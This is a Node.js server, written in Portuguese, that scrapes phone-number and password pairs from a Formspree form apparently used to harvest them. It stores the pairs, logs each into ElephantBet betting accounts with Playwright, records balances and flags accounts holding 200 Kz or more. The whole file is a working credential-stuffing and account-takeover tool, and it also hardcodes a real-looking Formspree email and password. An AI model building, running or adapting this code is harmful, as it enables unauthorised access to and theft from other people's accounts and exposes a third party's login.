const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const { chromium } = require('playwright');

const app = express();
const PORT = 3000;
const LOGIN_URL = 'https://www.elephantbet.co.ao/pt/';
const FORMPREE_LOGIN_URL = 'https://formspree.io/login';
const FORMPREE_EMAIL = 'leolourenco702@gmail.com';
const FORMPREE_SENHA = 'Domingos42@';

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname + '/public'));

const db = new sqlite3.Database('./contas.db');
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS contas (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    telefone TEXT NOT NULL, senha TEXT NOT NULL, obs TEXT,
    saldo TEXT DEFAULT '0 Kz', importante INTEGER DEFAULT 0, erro INTEGER DEFAULT 0,
    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
});

function dbGet(sql, params=[]) { return new Promise((res,rej)=>{ db.get(sql,params,(e,r)=> e?rej(e):res(r)); }); }
function dbRun(sql, params=[]) { return new Promise((res,rej)=>{ db.run(sql,params,function(e){ if(e) rej(e); else res(this); }); }); }
function limparTelefone(tel){ let dig=String(tel||'').replace(/\D/g,''); if(dig.startsWith('244')) dig=dig.substring(3); if(dig.length>9) dig=dig.slice(-9); return dig; }
function parseSaldo(str){ if(!str) return 0; const up=String(str).toUpperCase(); if(up.includes('DADOS')||up.includes('INVÁLIDA')||up.includes('INVALIDA')||up.includes('NÃO CADASTRADO')||up.includes('VERIFICANDO')||up.includes('FILA')) return 0; let num=String(str).replace(/[^0-9.,]/g,''); if(num.includes('.')&&num.includes(',')) num=num.replace(/\./g,'').replace(',','.'); else if(num.includes(',')) num=num.replace(',','.'); return parseFloat(num)||0; }
function isLixo(m){ if(!m) return true; const l=m.toLowerCase(); if(l.includes('_date')) return true; if(l.includes('contacto')&&l.includes('mensagem')) return true; if(m.length>40) return true; return false; }

app.get('/api/contas', (req,res)=>{ db.all('SELECT * FROM contas ORDER BY id ASC',(e,r)=>res.json(r||[])); });
app.post('/api/contas',async (req,res)=>{ 
  const {telefone,senha}=req.body; 
  if(isLixo(senha)) return res.json({ok:false});
  const telLimpo = limparTelefone(telefone);
  if(!/^9\d{8}$/.test(telLimpo)) return res.json({ok:false});
  const existe = await dbGet('SELECT id FROM contas WHERE telefone=?',[telLimpo]);
  if(existe) return res.json({id:existe.id, jaExiste:true});
  db.run('INSERT INTO contas (telefone,senha,obs,importante,erro) VALUES (?,?,?,?,0)',[telLimpo,senha,`Formpree AUTO`,1], function(){ res.json({id:this.lastID}); }); 
});
app.post('/api/contas/limpar-duplicadas', (req,res)=>{
  db.all('SELECT * FROM contas ORDER BY id ASC', (err, rows)=>{
    if(err) return res.json({ok:false});
    const vistos = new Map(); const dups=[];
    rows.forEach(r=>{ if(vistos.has(r.telefone)) dups.push(r.id); else vistos.set(r.telefone, r.id); });
    if(dups.length===0) return res.json({ok:true, removidas:0});
    db.run(`DELETE FROM contas WHERE id IN (${dups.map(()=>'?').join(',')})`, dups, function(){ res.json({ok:true, removidas:dups.length}); });
  });
});
app.put('/api/contas/:id',(req,res)=>{ const {telefone,senha,obs,importante}=req.body; const telLimpo=limparTelefone(telefone); db.run('UPDATE contas SET telefone=?, senha=?, obs=?, importante=?, erro=0, saldo="0 Kz" WHERE id=?',[telLimpo,senha,obs,importante?1:0,req.params.id], ()=>res.json({ok:true})); });
app.delete('/api/contas',(req,res)=>{ db.run('DELETE FROM contas',[],()=>res.json({ok:true})); });
app.delete('/api/contas/:id',(req,res)=>{ db.run('DELETE FROM contas WHERE id=?',[req.params.id],()=>res.json({ok:true})); });

let rodando=false, inicioIndex=0, modoAtual='auto', manualIndexAtual=0;
let statusAtual={conta:null, log:[], modo:'auto'};
function addLog(msg){ const h=new Date().toLocaleTimeString(); statusAtual.log.unshift(`[${h}] ${msg}`); if(statusAtual.log.length>150) statusAtual.log.pop(); console.log(msg); }
function dbUpdate(sql, params){ return new Promise((res,rej)=>{ db.run(sql, params, function(e){ if(e) rej(e); else res(); }); }); }

let economyBrowser = null;
let economyContext = null;
let economyPage = null;

let manualBrowser = null;
let manualContext = null;
let manualPage = null;

async function getEconomyPage(){
  if(economyPage && !economyPage.isClosed()) return {browser: economyBrowser, context: economyContext, page: economyPage};
  if(economyBrowser){ try{ await economyBrowser.close(); }catch{} }
  economyBrowser = await chromium.launch({ channel: 'chrome', headless: false });
  economyContext = await economyBrowser.newContext();
  economyPage = await economyContext.newPage();
  return {browser: economyBrowser, context: economyContext, page: economyPage};
}

// NOVO: MANUAL TAMBÉM REUTILIZA (não fecha mais)
async function getManualPage(){
  if(manualPage && !manualPage.isClosed()) return {browser: manualBrowser, context: manualContext, page: manualPage};
  if(manualBrowser){ try{ await manualBrowser.close(); }catch{} }
  manualBrowser = await chromium.launch({ channel: 'chrome', headless: false });
  manualContext = await manualBrowser.newContext();
  manualPage = await manualContext.newPage();
  return {browser: manualBrowser, context: manualContext, page: manualPage};
}

async function terminarSessaoElephantBet(page){
  try{
    addLog(`🔍 Fechando popups...`);
    try{
      const naoAgora = page.locator('button:has-text("Não agora")').first();
      if(await naoAgora.isVisible({timeout:2000}).catch(()=>false)){
        await naoAgora.click({force:true}).catch(()=>{});
        await page.waitForTimeout(1000);
      }
      await page.evaluate(() => {
        document.querySelectorAll('button').forEach(b=>{
          if(b.textContent.includes('Não agora')) b.click();
        });
      }).catch(()=>{});
    }catch{}
    await page.evaluate(() => {
      document.querySelectorAll('[class*="notification"], [class*="popup"]').forEach(el=>{
        if(el.textContent.includes('Know the moment') || el.textContent.includes('Allow Notifications')){
          el.style.display='none';
        }
      });
    }).catch(()=>{});

    addLog(`🚪 Clicando SAIR via JS...`);
    const clicouSair = await page.evaluate(() => {
      const btn = document.querySelector('.userLogoutBtn') || 
                  document.querySelector('li.logout-profile button') ||
                  Array.from(document.querySelectorAll('button')).find(b=>b.textContent.trim().toUpperCase()==='SAIR');
      if(btn){
        btn.scrollIntoView({behavior:'instant', block:'center'});
        btn.click();
        return true;
      }
      return false;
    }).catch(()=>false);

    if(!clicouSair){
      const logoutBtn = page.locator('.userLogoutBtn, li.logout-profile button, button:has-text("SAIR")').first();
      if(await logoutBtn.isVisible({timeout:3000}).catch(()=>false)){
        await logoutBtn.click({force:true}).catch(()=>{});
      }
    }

    await page.waitForTimeout(5000);
    addLog(`⏳ 5s após Sair - clicando ENTRAR sem reload`);
    
    const entrou = await page.evaluate(() => {
      const entrar = Array.from(document.querySelectorAll('button')).find(b=>b.textContent.trim()==='ENTRAR');
      if(entrar){ entrar.click(); return true; }
      return false;
    }).catch(()=>false);

    if(!entrou){
      const entrarBtn = page.getByRole('button',{name:'ENTRAR'}).first();
      if(await entrarBtn.isVisible({timeout:5000}).catch(()=>false)){
        await entrarBtn.click({force:true}).catch(()=>{});
      }
    }
    await page.waitForTimeout(3000);
    return true;
  }catch(e){
    addLog(`⚠️ Erro terminar: ${e.message}`);
    try{ await page.context().clearCookies(); }catch{}
    await page.waitForTimeout(2000);
    return true;
  }
}

async function logarContaEconomica(conta){
  try{
    const {page} = await getEconomyPage();
    const jaLogado = await page.locator('p.balanceAmount').first().isVisible().catch(()=>false);
    if(jaLogado){ await terminarSessaoElephantBet(page); await page.waitForTimeout(2000); }
    const temCampo = await page.locator('input[name="username"]').first().isVisible().catch(()=>false);
    const temEntrar = await page.getByRole('button',{name:'ENTRAR'}).first().isVisible().catch(()=>false);
    if(!temCampo && !temEntrar){
      await page.goto(LOGIN_URL, {waitUntil:'domcontentloaded', timeout:20000});
      await page.waitForTimeout(3000);
    }
    const phoneInput = page.locator('input[name="username"]');
    if(!(await phoneInput.isVisible().catch(()=>false))){
      const entrarBtn = page.getByRole('button',{name:'ENTRAR'}).first();
      if(await entrarBtn.isVisible({timeout:5000}).catch(()=>false)){
        await entrarBtn.click({force:true}).catch(()=>{});
        await page.waitForTimeout(2000);
      }
    }
    await phoneInput.waitFor({state:'visible', timeout:10000}).catch(()=>{});
    addLog(`⌨️ Preenchendo ${conta.telefone}`);
    await phoneInput.click(); await page.waitForTimeout(500);
    await page.keyboard.press('Control+A'); await page.keyboard.press('Backspace');
    await page.waitForTimeout(500);
    await page.keyboard.type(conta.telefone,{delay:80});
    await page.waitForTimeout(1000);
    const passInput = page.locator('input[name="password"]');
    await passInput.click(); await page.waitForTimeout(500);
    await page.keyboard.press('Control+A'); await page.keyboard.press('Backspace');
    await page.waitForTimeout(500);
    await page.keyboard.type(conta.senha,{delay:80});
    await page.waitForTimeout(1500);
    await page.locator('#login_form_id button[type="submit"]').click();
    await page.waitForTimeout(4000);
    const temSaldo = await page.locator('p.balanceAmount').first().isVisible().catch(()=>false);
    let saldoTexto = 'DADOS INCORRECTOS';
    if(temSaldo){
      saldoTexto = (await page.locator('p.balanceAmount').first().textContent()).trim();
      addLog(`💰 ${conta.telefone} -> ${saldoTexto}`);
      await dbUpdate('UPDATE contas SET saldo=?, erro=0 WHERE id=?',[saldoTexto, conta.id]);
      await page.waitForTimeout(3000);
    }else{
      await dbUpdate('UPDATE contas SET saldo=?, erro=1 WHERE id=?',['DADOS INCORRECTOS', conta.id]);
    }
    await terminarSessaoElephantBet(page);
    return saldoTexto;
  }catch(e){
    addLog(`⚠️ Erro ${conta.telefone}: ${e.message}`);
    await dbUpdate('UPDATE contas SET saldo=?, erro=1 WHERE id=?',['DADOS INCORRECTOS', conta.id]).catch(()=>{});
    return 'DADOS INCORRECTOS';
  }
}

// MANUAL CORRIGIDO: NÃO FECHA NAVEGADOR, SÓ FAZ SAIR -> ENTRAR
async function logarContaManual(conta){
  try{
    const {page} = await getManualPage();
    
    // Se já logado, termina sessão SEM FECHAR NAVEGADOR (igual ao AUTO)
    const jaLogado = await page.locator('p.balanceAmount').first().isVisible().catch(()=>false);
    if(jaLogado){
      addLog(`🔄 MANUAL: Já logado, terminando sessão sem fechar navegador...`);
      await terminarSessaoElephantBet(page);
      await page.waitForTimeout(2000);
    }
    
    const temCampo = await page.locator('input[name="username"]').first().isVisible().catch(()=>false);
    const temEntrar = await page.getByRole('button',{name:'ENTRAR'}).first().isVisible().catch(()=>false);
    if(!temCampo && !temEntrar){
      addLog(`🌐 MANUAL primeira vez - indo pra página`);
      await page.goto(LOGIN_URL, {waitUntil:'domcontentloaded', timeout:20000});
      await page.waitForTimeout(3000);
    }
    
    const phoneInput = page.locator('input[name="username"]');
    if(!(await phoneInput.isVisible().catch(()=>false))){
      const entrarBtn = page.getByRole('button',{name:'ENTRAR'}).first();
      if(await entrarBtn.isVisible({timeout:5000}).catch(()=>false)){
        await entrarBtn.click({force:true}).catch(()=>{});
        await page.waitForTimeout(2000);
      }
    }
    
    await phoneInput.waitFor({state:'visible', timeout:10000}).catch(()=>{});
    addLog(`⌨️ MANUAL preenchendo ${conta.telefone}`);
    await phoneInput.click(); await page.waitForTimeout(500);
    await page.keyboard.press('Control+A'); await page.keyboard.press('Backspace');
    await page.waitForTimeout(500);
    await page.keyboard.type(conta.telefone,{delay:80});
    await page.waitForTimeout(1000);
    const passInput = page.locator('input[name="password"]');
    await passInput.click(); await page.waitForTimeout(500);
    await page.keyboard.press('Control+A'); await page.keyboard.press('Backspace');
    await page.waitForTimeout(500);
    await page.keyboard.type(conta.senha,{delay:80});
    await page.waitForTimeout(1500);
    await page.locator('#login_form_id button[type="submit"]').click();
    await page.waitForTimeout(4000);
    const temSaldo = await page.locator('p.balanceAmount').first().isVisible().catch(()=>false);
    let saldoTexto = 'DADOS INCORRECTOS';
    if(temSaldo){
      saldoTexto = (await page.locator('p.balanceAmount').first().textContent()).trim();
      addLog(`💰 MANUAL ${conta.telefone} -> ${saldoTexto} - AGUARDANDO Próxima`);
      await dbUpdate('UPDATE contas SET saldo=?, erro=0 WHERE id=?',[saldoTexto, conta.id]);
    }else{
      await dbUpdate('UPDATE contas SET saldo=?, erro=1 WHERE id=?',['DADOS INCORRECTOS', conta.id]);
    }
    // NÃO termina sessão no manual, deixa logado pra você ver o saldo como no print
    return saldoTexto;
  }catch(e){
    addLog(`⚠️ Erro manual ${conta.telefone}: ${e.message}`);
    return 'DADOS INCORRECTOS';
  }
}

async function logarConta(conta, manterAberto=false){
  if(manterAberto){
    return await logarContaManual(conta);
  } else {
    return await logarContaEconomica(conta);
  }
}

async function logarContaLeve(conta){ return await logarContaEconomica(conta); }
async function getContasValidas(){ return new Promise((res,rej)=>{ db.all('SELECT * FROM contas WHERE erro=0 OR erro IS NULL ORDER BY id ASC',(err,rows)=> err?rej(err):res(rows)); }); }
async function executarManual(index){
  const contas = await getContasValidas();
  if(contas.length===0){ addLog('Nenhuma válida'); return; }
  if(index >= contas.length) index = 0;
  manualIndexAtual = index; const c = contas[index];
  statusAtual.conta = `[${index+1}/${contas.length}] ${c.telefone} - LOGANDO...`;
  await logarConta(c, true);
  statusAtual.conta = `[${index+1}/${contas.length}] ${c.telefone} - AGUARDANDO`;
}
async function loopInfinitoAuto(){
  while(rodando && modoAtual==='auto'){
    const contas = await getContasValidas();
    if(contas.length===0){ addLog('Nenhuma válida'); await new Promise(r=>setTimeout(r,10000)); continue; }
    for(let i=inicioIndex;i<contas.length;i++){
      if(!rodando || modoAtual!=='auto') break;
      const c=contas[i]; statusAtual.conta=`[${i+1}/${contas.length}] ${c.telefone} [SEM RELOAD]`; addLog(`[${i+1}] ${c.telefone} - Sair->Entrar`);
      await logarConta(c, false);
    } inicioIndex=0;
  }
}

let formpreeRodando=false, formpreeBrowser=null, formpreePage=null, formpreeInterval=null, formpreeReloadInterval=null;
let formpreeStatus={conta:null, log:[], submissions:[], url:'', total:0};
let processandoFormpree = false;
function addLogFormpree(msg){ const h=new Date().toLocaleTimeString(); formpreeStatus.log.unshift(`[${h}] ${msg}`); if(formpreeStatus.log.length>150) formpreeStatus.log.pop(); console.log('[FORMPREE] '+msg); }
async function extrairSubmissoesFormpree(page){
  try{
    await page.waitForSelector('div[style*="--col-size-contacto"]', {timeout:5000}).catch(()=>{});
    await page.evaluate(async ()=>{
      const scrollers = document.querySelectorAll('div[class*="overflow-auto"], main, [class*="overflow-y"]');
      for(const el of scrollers){ if(el.scrollHeight > el.clientHeight){ el.scrollTop = 0; for(let i=0;i<5;i++){ el.scrollTop += 400; await new Promise(r=>setTimeout(r,200)); } el.scrollTop = 0; } }
    });
    await page.waitForTimeout(1000);
    return await page.evaluate(()=>{
      const results=[]; const contactoEls = Array.from(document.querySelectorAll('div[style*="--col-size-contacto"]')); const mensagemEls = Array.from(document.querySelectorAll('div[style*="--col-size-mensagem"]')); const valorEls = Array.from(document.querySelectorAll('div[style*="--col-size-valor"]'));
      for(let i=0;i<contactoEls.length;i++){ const contacto = (contactoEls[i]?.innerText || '').trim(); const mensagem = (mensagemEls[i]?.innerText || '').trim(); const valor = (valorEls[i]?.innerText || '').trim(); if(!contacto) continue; if(!/^[0-9]{9}$/.test(contacto.replace(/\D/g,''))) continue; if(mensagem.length > 35) continue; if(mensagem.toLowerCase().includes('_date') || contacto.includes('_date')) continue; results.push({ contacto, mensagem, valor }); } return results;
    });
  }catch(e){ return []; }
}
async function checkFormpreeSubmissions(apenasLer = false){
  if(!formpreePage || !formpreeRodando || processandoFormpree) return;
  processandoFormpree = true;
  try{
    const url = formpreePage.url(); formpreeStatus.url = url;
    if(!url.includes('formspree.io')){ processandoFormpree=false; return; }
    const raw = await extrairSubmissoesFormpree(formpreePage);
    addLogFormpree(`📥 Lidas ${raw.length} linhas válidas`);
    const enriched = [];
    for(const sub of raw){
      const telLimpo = limparTelefone(sub.contacto); const senhaForm = (sub.mensagem||'').trim();
      if(!telLimpo || !senhaForm) continue; if(!/^9\d{8}$/.test(telLimpo)) continue; if(isLixo(senhaForm)) continue;
      const existe = await dbGet('SELECT * FROM contas WHERE telefone=? ORDER BY id DESC',[telLimpo]);
      let jaCadastrado = false; let saldoBanco = 'Não cadastrado';
      if(existe){ jaCadastrado = true; saldoBanco = existe.saldo || '0 Kz'; }
      else { try{ await dbRun('INSERT INTO contas (telefone, senha, obs, importante, erro) VALUES (?,?,?,?,0)',[telLimpo, senhaForm, `Formpree AUTO Valor:${sub.valor||'0'}`, 1]); addLogFormpree(`✅ AUTO: ${telLimpo}`); saldoBanco = '0 Kz - Na fila'; }catch{} }
      const contaAtual = await dbGet('SELECT saldo FROM contas WHERE telefone=? ORDER BY id DESC',[telLimpo]);
      if(contaAtual && contaAtual.saldo){ saldoBanco = contaAtual.saldo; }
      const valorNumerico = parseSaldo(sub.valor);
      enriched.push({ contacto: sub.contacto, telefoneLimpo: telLimpo, mensagem: senhaForm, valorFormpree: sub.valor || '', valorNumerico, jaCadastrado, saldo: saldoBanco, saldoValor: parseSaldo(saldoBanco) || valorNumerico });
    }
    formpreeStatus.submissions = enriched;
    const com200 = enriched.filter(e=> e.valorNumerico >= 200 || e.saldoValor >= 200);
    if(com200.length>0){ com200.sort((a,b)=> b.valorNumerico - a.valorNumerico); const maior = com200[0]; formpreeStatus.conta = `🚨 ${maior.telefoneLimpo} | ${maior.valorNumerico}Kz - 200Kz+`; }
    if(!apenasLer){
      for(const item of enriched){
        if(item.jaCadastrado) continue;
        const conta = await dbGet('SELECT * FROM contas WHERE telefone=? ORDER BY id DESC',[item.telefoneLimpo]);
        if(conta && (conta.saldo === '0 Kz' || conta.saldo.includes('fila'))){ addLogFormpree(`🔍 Verificando: ${conta.telefone}`); await logarContaLeve(conta); await new Promise(r=>setTimeout(r,3000)); }
      }
    }
  }catch(e){ addLogFormpree(`⚠ Erro: ${e.message}`); }
  processandoFormpree = false;
}
async function startFormpree(){
  if(formpreeRodando) return;
  formpreeBrowser = await chromium.launch({ channel:'chrome', headless:false });
  formpreePage = await formpreeBrowser.newPage();
  formpreeRodando = true;
  addLogFormpree('🌐 Formpree ABERTO...');
  await formpreePage.goto(FORMPREE_LOGIN_URL,{waitUntil:'domcontentloaded'});
  await formpreePage.waitForTimeout(3000);
  try{
    await formpreePage.waitForSelector('#email-address', {timeout:8000});
    await formpreePage.locator('#email-address').fill(FORMPREE_EMAIL);
    await formpreePage.waitForTimeout(1000);
    await formpreePage.locator('input[type="password"]').first().fill(FORMPREE_SENHA);
    await formpreePage.waitForTimeout(1000);
    await formpreePage.locator('button[type="submit"]').first().click();
    await formpreePage.waitForTimeout(6000);
    let botGptBtn = formpreePage.locator('a[href="/forms/mpwjanlj/overview"]').first();
    if(!(await botGptBtn.isVisible({timeout:3000}).catch(()=>false))) botGptBtn = formpreePage.locator('a:has-text("BOTGPT")').first();
    if(await botGptBtn.isVisible({timeout:5000}).catch(()=>false)){ await botGptBtn.click(); await formpreePage.waitForTimeout(3000); let subBtn = formpreePage.locator('a[href="/forms/mpwjanlj/submissions"]').first(); if(!(await subBtn.isVisible({timeout:3000}).catch(()=>false))) subBtn = formpreePage.locator('a:has-text("Submissions")').first(); if(await subBtn.isVisible({timeout:5000}).catch(()=>false)){ await subBtn.click(); await formpreePage.waitForTimeout(3000); } else await formpreePage.goto('https://formspree.io/forms/mpwjanlj/submissions', {waitUntil:'domcontentloaded'}).catch(()=>{}); }
  }catch(e){ addLogFormpree(`⚠ Erro: ${e.message}`); }
  formpreeInterval = setInterval(()=>checkFormpreeSubmissions(false), 90000);
  formpreeReloadInterval = setInterval(async ()=>{ if(formpreePage && formpreeRodando){ try{ addLogFormpree('🔄 Reload 90s...'); await formpreePage.reload({waitUntil:'domcontentloaded'}); await new Promise(r=>setTimeout(r,3000)); await checkFormpreeSubmissions(false); }catch{} } }, 90000);
}
async function stopFormpree(){
  formpreeRodando=false;
  if(formpreeInterval) clearInterval(formpreeInterval);
  if(formpreeReloadInterval) clearInterval(formpreeReloadInterval);
  formpreeInterval=null; formpreeReloadInterval=null;
  if(formpreeBrowser){ try{ await formpreeBrowser.close(); }catch{} formpreeBrowser=null; formpreePage=null; }
  addLogFormpree('🔴 Formpree FECHADO');
}
app.post('/api/automacao/start',(req,res)=>{ const inicio=parseInt(req.body.inicio||1); inicioIndex=Math.max(0,inicio-1); modoAtual='auto'; statusAtual.modo='auto'; rodando=true; db.run('UPDATE contas SET saldo="0 Kz" WHERE erro=0 OR erro IS NULL'); addLog(`AUTO da ${inicio}`); loopInfinitoAuto(); res.json({ok:true}); });
app.post('/api/automacao/auto/start',(req,res)=>{ const inicio=parseInt(req.body.inicio||1); inicioIndex=Math.max(0,inicio-1); modoAtual='auto'; statusAtual.modo='auto'; rodando=true; db.run('UPDATE contas SET saldo="0 Kz" WHERE erro=0 OR erro IS NULL'); addLog(`AUTO [SEM RELOAD] da ${inicio}`); loopInfinitoAuto(); res.json({ok:true}); });
app.post('/api/automacao/manual/start', async (req,res)=>{ 
  const inicio=parseInt(req.body.inicio||1); 
  manualIndexAtual=Math.max(0,inicio-1); 
  modoAtual='manual'; statusAtual.modo='manual'; rodando=true; 
  addLog(`MANUAL da ${inicio} - sem fechar navegador`); 
  await executarManual(manualIndexAtual); 
  res.json({ok:true}); 
});
app.post('/api/automacao/manual/next', async (req,res)=>{ 
  if(modoAtual!=='manual') return res.json({ok:false}); 
  // CORREÇÃO: não fecha navegador, só termina sessão e vai pra próxima
  const contas = await getContasValidas();
  if(manualPage){
    const jaLogado = await manualPage.locator('p.balanceAmount').first().isVisible().catch(()=>false);
    if(jaLogado){
      addLog(`🔄 Próxima: terminando sessão ${contas[manualIndexAtual]?.telefone} sem fechar navegador`);
      await terminarSessaoElephantBet(manualPage);
      await new Promise(r=>setTimeout(r,2000));
    }
  }
  manualIndexAtual++; 
  await executarManual(manualIndexAtual); 
  res.json({ok:true}); 
});
app.post('/api/automacao/stop', async (req,res)=>{ 
  rodando=false; inicioIndex=0; statusAtual.conta=null; statusAtual.modo='auto'; modoAtual='auto'; 
  if(manualBrowser){ try{ await manualBrowser.close(); }catch{} manualBrowser=null; manualPage=null; manualContext=null; } 
  if(economyBrowser){ try{ await economyBrowser.close(); }catch{} economyBrowser=null; economyPage=null; economyContext=null; } 
  addLog('PARADA'); res.json({ok:true}); 
});
app.get('/api/automacao/status',(req,res)=>{ res.json({rodando, modo:modoAtual, manualIndex:manualIndexAtual+1, inicioAtual:inicioIndex+1,...statusAtual}); });
app.post('/api/formpree/start', async (req,res)=>{ await startFormpree(); res.json({ok:true}); });
app.post('/api/formpree/stop', async (req,res)=>{ await stopFormpree(); res.json({ok:true}); });
app.post('/api/formpree/check', async (req,res)=>{ await checkFormpreeSubmissions(true); res.json({ok:true, submissions: formpreeStatus.submissions}); });
app.get('/api/formpree/status',(req,res)=>{ res.json({rodando: formpreeRodando, ...formpreeStatus}); });
app.listen(PORT,()=>console.log(`MANUAL FIX - NÃO FECHA NAVEGADOR http://localhost:${PORT}`));